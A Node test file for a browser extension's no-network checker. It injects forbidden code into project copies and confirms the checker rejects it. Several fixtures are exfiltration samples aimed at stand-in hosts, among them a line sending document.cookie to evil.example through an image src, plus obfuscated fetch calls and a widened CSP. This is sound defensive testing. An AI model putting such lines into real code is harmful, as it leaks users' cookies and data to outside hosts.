import test from 'node:test';
import assert from 'node:assert/strict';
import { cpSync, mkdtempSync, appendFileSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');

// Copies the shipped files plus the check script into a temp dir so the real tree is never touched.
function copyProject() {
  const dir = mkdtempSync(join(tmpdir(), 'ra-check-'));
  for (const f of ['manifest.json', 'popup.html', 'popup.css', 'popup.js', 'options.html', 'options.js', 'lib', 'data']) {
    cpSync(join(root, f), join(dir, f), { recursive: true });
  }
  mkdirSync(join(dir, 'scripts'));
  cpSync(join(root, 'scripts/check-no-network.mjs'), join(dir, 'scripts/check-no-network.mjs'));
  return dir;
}

const run = (dir) => spawnSync(process.execPath, [join(dir, 'scripts/check-no-network.mjs')], { encoding: 'utf8' });

test('the check passes on the real project', () => {
  assert.equal(run(copyProject()).status, 0);
});

test('the check fails when network code is injected', () => {
  const dir = copyProject();
  appendFileSync(join(dir, 'popup.js'), "\nfetch('https://example.com');\n");
  const result = run(dir);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /popup\.js contains fetch/);
});

test('the check fails when a host permission is added', () => {
  const dir = copyProject();
  const file = join(dir, 'manifest.json');
  const manifest = JSON.parse(readFileSync(file, 'utf8'));
  manifest.host_permissions = ['<all_urls>'];
  writeFileSync(file, JSON.stringify(manifest, null, 2));
  const result = run(dir);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /host_permissions/);
});

test('the check fails on import() anywhere but the address loader', () => {
  const dir = copyProject();
  appendFileSync(join(dir, 'popup.js'), "\nimport('./lib/states.js');\n");
  const result = run(dir);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /popup\.js contains dynamic import\(\)/);
});

test('the check fails when the address loader imports anything else', () => {
  const dir = copyProject();
  const file = join(dir, 'lib/addresses.js');
  writeFileSync(file, readFileSync(file, 'utf8').replace('`../data/addresses/${state}.js`', '`../data/${state}.js`'));
  const result = run(dir);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /lib\/addresses\.js contains dynamic import\(\)/);
});

// Edits lib/alias.js in a copy of the project and returns the check's result.
function runWithAlias(edit) {
  const dir = copyProject();
  const file = join(dir, 'lib/alias.js');
  const before = readFileSync(file, 'utf8');
  const after = edit(before);
  assert.notEqual(after, before, 'the edit applied');
  writeFileSync(file, after);
  return run(dir);
}

test('the check fails when the alias module gains a third address', () => {
  const result = runWithAlias((t) => t.replace("label: 'DuckDuckGo',", "label: 'DuckDuckGo', mirror: 'https://collector.example',"));
  assert.equal(result.status, 1);
  assert.match(result.stderr, /lib\/alias\.js contains http\(s\):\/\/ URL/);
});

test('the check fails when a service URL is pointed at another host, however it is written', () => {
  for (const url of [
    "'https://relay.firefox.com.evil.example/x'",
    "'https:' + '/' + '/evil.example' + '/x'",
    "globalThis.process ? 'https://relay.firefox.com/api/v1/relayaddresses/' : 'x'",
  ]) {
    const result = runWithAlias((t) => t.replace("'https://relay.firefox.com/api/v1/relayaddresses/'", url));
    assert.equal(result.status, 1, url);
    assert.match(result.stderr, /service URLs must be exactly/, url);
  }
});

test('the check fails when a service URL is rewritten later', () => {
  const result = runWithAlias((t) => `${t}\nsetTimeout(() => { ALIAS_SERVICES.relay.url = 'x'; });\n`);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /must not rewrite a service URL/);
});

test('shipped code cannot end the check early, because the check never runs it', () => {
  const dir = copyProject();
  for (const f of ['lib/alias.js', 'lib/addresses.js', 'lib/generate.js']) appendFileSync(join(dir, f), '\nglobalThis.process?.exit(0);\n');
  const file = join(dir, 'manifest.json');
  const manifest = JSON.parse(readFileSync(file, 'utf8'));
  manifest.host_permissions = ['<all_urls>'];
  writeFileSync(file, JSON.stringify(manifest, null, 2));
  const result = run(dir);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /host_permissions/);
});

test('the check fails on ways out of the page that avoid fetch and URLs', () => {
  for (const [code, label] of [
    ["new Image().src = 'https:' + '//evil.example?d=' + document.cookie;", /new Image|\.src assignment/],
    ["window['fe' + 'tch']('https:' + '//evil.example');", /computed global access/],
    ["globalThis['fet' + 'ch']('x');", /computed global access/],
    ["location.href = 'https:' + '//evil.example';", /navigation/],
    ["open('https:' + '//evil.example');", /open\(/],
    ["document.body.insertAdjacentHTML('beforeend', '<img src=x>');", /HTML from a string/],
    ["document.createElement('img');", /loading element/],
    ["el.setAttribute('src', 'x');", /URL attribute/],
  ]) {
    const dir = copyProject();
    appendFileSync(join(dir, 'lib/autofill.js'), `\n${code}\n`);
    const result = run(dir);
    assert.equal(result.status, 1, code);
    assert.match(result.stderr, label, code);
  }
});

test('the check fails on any other use of fetch, called or not', () => {
  for (const edit of [
    (t) => t.replace('await globalThis.fetch(svc.url, {', 'await globalThis.fetch.call(null, svc.url, {'),
    (t) => t.replace('await globalThis.fetch(svc.url, {', 'await globalThis.fetch(site, {'),
    (t) => t.replace('export class AliasError', 'export const send = globalThis.fetch;\nexport class AliasError'),
  ]) {
    const result = runWithAlias(edit);
    assert.equal(result.status, 1);
    assert.match(result.stderr, /lib\/alias\.js contains fetch/);
  }
});

test('the check fails when an optional host outside the alias services is added', () => {
  const dir = copyProject();
  const file = join(dir, 'manifest.json');
  const manifest = JSON.parse(readFileSync(file, 'utf8'));
  manifest.optional_host_permissions = [...manifest.optional_host_permissions, 'https://collector.example/*'];
  writeFileSync(file, JSON.stringify(manifest, null, 2));
  const result = run(dir);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /optional host permission not allowed: https:\/\/collector\.example\/\*/);
});

test('the check fails when any CSP directive is widened', () => {
  for (const [from, to] of [
    ['connect-src ', 'connect-src https://collector.example '],
    ["img-src 'self'", "img-src 'self' https://collector.example"],
    ["default-src 'none'", "default-src 'none' https:"],
  ]) {
    const dir = copyProject();
    const file = join(dir, 'manifest.json');
    const manifest = JSON.parse(readFileSync(file, 'utf8'));
    manifest.content_security_policy.extension_pages = manifest.content_security_policy.extension_pages.replace(from, to);
    writeFileSync(file, JSON.stringify(manifest, null, 2));
    const result = run(dir);
    assert.equal(result.status, 1, to);
    assert.match(result.stderr, /CSP must be exactly/, to);
  }
});
